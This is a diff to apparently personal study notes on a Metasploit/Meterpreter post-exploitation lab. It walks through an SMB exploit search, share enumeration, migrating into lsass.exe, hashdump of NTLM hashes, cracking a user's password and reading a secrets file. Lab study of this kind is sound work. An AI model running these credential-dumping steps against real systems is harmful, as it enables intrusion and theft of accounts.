@@ -172,3 +172,52 @@ The post-exploitation phase will have several goals; Meterpreter has functions
 - Lateral movement.
 
 Once any additional tool is loaded using the `load` command, you will see new options on the `help` menu. The example below shows commands added for the Kiwi module (using the `load kiwi` command). These will change according to the loaded menu, so running the `help` command after loading a module is always a good idea.![[Pasted image 20240816025559.png]]
+
+
+0) Gaining acces using SMB exploit for windows
+	`search category:exploit smb`
+
+![[Pasted image 20240816150220.png]]
+![[Pasted image 20240816150002.png]]
+
+![[Pasted image 20240816150022.png]]
+
+
+1) What is the computer name?
+	`sysinfo`
+	
+![[Pasted image 20240816150311.png]]
+
+2) What is the target domain?
+![[Pasted image 20240816150558.png]]
+
+3) What is the name of the share likely created by the user?
+	 `background` 
+	 `search category:post gather enum_shares`
+	 
+	 `sessions -i 1`
+	 ```run post/windows/gather/enum_shares ```
+	 
+![[Pasted image 20240816151154.png]]
+
+4) What is the NTLM hash of the jchambers user?
+	`migrate to the "lsass.exe" process first (ps will list its PID)`
+	`ps`
+	`ps | grep lsass.exe`
+
+	`migrate 760(PID)`
+	`hashdump`
+	
+![[Pasted image 20240816151936.png]]
+
+5) What is the cleartext password of the jchambers user?
+	we need to use a NTLM hash cracker
+	![[Pasted image 20240816152250.png]]
+
+6) Where is the "secrets.txt"  file located? (Full path of the file)
+	`search -f secrets.txt`
+
+7) What is the Twitter password revealed in the "secrets.txt" file?
+	`cat secrets.txt ('full path')`
+	![[Pasted image 20240816152631.png]]
+
